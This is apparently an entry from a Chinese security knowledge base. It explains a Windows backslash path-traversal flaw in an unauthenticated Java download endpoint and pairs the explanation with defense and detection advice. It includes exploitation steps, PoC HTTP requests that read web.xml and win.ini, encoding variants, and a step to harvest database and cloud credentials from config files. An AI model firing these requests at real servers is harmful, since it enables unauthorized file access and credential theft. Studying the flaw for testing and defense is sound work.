---
id: web-generic-file-inclusion-windows-backslash-download-traversal
title: Windows 下载接口只替换正斜杠，反斜杠 ..\ 穿越读取任意文件
type: scenario
domain: web
path: web/generic/file-inclusion
technique: windows-backslash-path-traversal-download
tags:
- file-download
- path-traversal
- windows
- backslash
- java
- unauth
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V4
  verified_at: '2026-11-04T21:42:52+08:00'
  notes: 已对照原文核对：CommonFileDownload只replaceAll("/","\\")，反斜杠..\不受影响；截图6读出WEB-INF/web.xml、7读出win.ini、8双参数fileName分支同样穿越。双参数分支拼接由行为推断已注明；未设versions；未执行PoC
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-windows-backslash-download-traversal/
draft: false
kb_aliases:
- 任意文件下载
- allPathName 穿越
- replaceAll 只防一半
- Windows 反斜杠穿越
- 下载接口路径穿越
---

## 一句话结论

无认证的文件下载接口用 `allPathName.replaceAll("/", "\\")` “统一路径分隔符”，但只替换正斜杠；攻击者提交 `..\..\..\windows\win.ini`（反斜杠或 `%5C`），过滤找不到 `/` 原样放行，随后 `new File(realPath, fileName)` 直接拼出越权路径，读取 Web 目录外的任意文件。

## 原理

代码逻辑：

```java
String allPathName = request.getParameter("allPathName");
allPathName = allPathName.replaceAll("/", Matcher.quoteReplacement(File.separator));
filePath = allPathName.substring(0, allPathName.lastIndexOf(File.separator));
fileName = allPathName.substring(allPathName.lastIndexOf(File.separator) + 1);
this.realPath = request.getSession().getServletContext().getRealPath(filePath);
file = new File(this.realPath, fileName);
if (file.exists()) { /* 读流输出 */ }
```

开发者以为把 `/` 换成 `\` 就能统一分隔符并阻止穿越，但：

- `replaceAll` 只处理 `/`，不处理 `\`；在 Windows 上 `..\` 本身就是合法分隔符；
- 攻击者用 `..\..\..\..\..\windows\win.ini` 时，字符串中没有 `/`，替换不会发生；
- 按最后一个 `\` 切分后，`filePath` 与 `fileName` 仍保留 `..`；
- `getRealPath(filePath)` 与 `new File(realPath, fileName)` 没有做规范化后的根目录校验，`..` 会把路径带到 Web 根之外。

此外还有 `filePath` + `fileName` 双参数分支：`fileName` 直接拼到 `new File(realPath, fileName)`，零过滤，同样可穿越。

## 触发条件

- 目标运行在 Windows（分隔符为 `\`）；
- 下载接口无需认证或认证可绕过；
- 参数 `allPathName`（或 `filePath`+`fileName`）完全可控；
- 过滤只做正斜杠替换/黑名单，未做规范化与根目录校验；
- 运行账户对目标文件有读权限。

## 利用步骤

1. 找到 `/fileDownload?method=CommonDownload` 一类下载接口，确认参数名（`allPathName` 或 `filePath`/`fileName`）。
2. 先读 Web 目录内文件验证功能：`filePath=WEB-INF&fileName=web.xml`。
3. 用反斜杠穿越读取系统文件：`allPathName=..\..\..\..\..\windows\win.ini`。
4. 或走双参数零过滤分支：`filePath=&fileName=..\..\..\..\..\windows\win.ini`。
5. 读取应用配置（`dbConfig.properties`、`WEB-INF/web.xml`、连接串）进一步获取数据库/云凭据；读取 `win.ini` 仅用于证明越权。

## PoC

```http
GET /fileDownload?method=CommonDownload&filePath=WEB-INF&fileName=web.xml HTTP/1.1
Host: target
```

```http
GET /fileDownload?method=CommonDownload&allPathName=..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1
Host: target
```

```http
GET /fileDownload?method=CommonDownload&filePath=&fileName=..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1
Host: target
```

响应头 `Content-Disposition: attachment; filename="WIN.INI"`，正文为 `; for 16-bit app support`、`[fonts]` 等，证明已读出 `C:\windows\win.ini`。

## 变体与关联

- 变体：`%5C` 双重编码、`..%5c`、`....\\`、绝对路径 `C:\windows\win.ini`、UNC 路径；若只过滤 `../`，可用 `..\`、`..%5c`、`..%255c`。
- 变体：Linux 目标上若只替换 `\` 而放行 `/`，则用 `../../etc/passwd`；核心是“过滤的分隔符与实际解析的分隔符不一致”。
- 关联：[[web-generic-file-inclusion-windows-sam-ntlm-crack]]（文件读取到凭据利用）；[[pentest-recon-web-config-robots-credential-leak]]（配置文件泄露凭据）；[[web-generic-sqli-exists-left-boolean-oracle]]（同一系统的注入点）。
- 不确定点：文章未给出完整 `CommonFileDownload` 源码，双参数分支的具体拼接由请求行为推断；`getRealPath` 对不存在的父目录返回值可能因容器而异。

## 检测与防御

- **规范化校验**：先 `File.getCanonicalPath()`，再检查结果是否以允许的根目录开头；拒绝包含 `..`、绝对路径、盘符、UNC 的输入。
- **参数设计**：不要让客户端传完整路径；用文件 ID/白名单映射到固定目录；只取 `basename` 并校验扩展名。
- **分隔符**：同时处理 `/` 与 `\`，并在解码后（含多重编码）再做校验；不要只替换一种分隔符。
- **权限**：下载接口加认证与授权；运行账户最小权限；Web 目录外无读权限。
- **日志检测**：参数含 `..`、`%5c`、`%2f`、盘符、`windows`、`WEB-INF`；下载响应出现 `Content-Disposition` 且文件名异常；同一 IP 高频枚举路径。
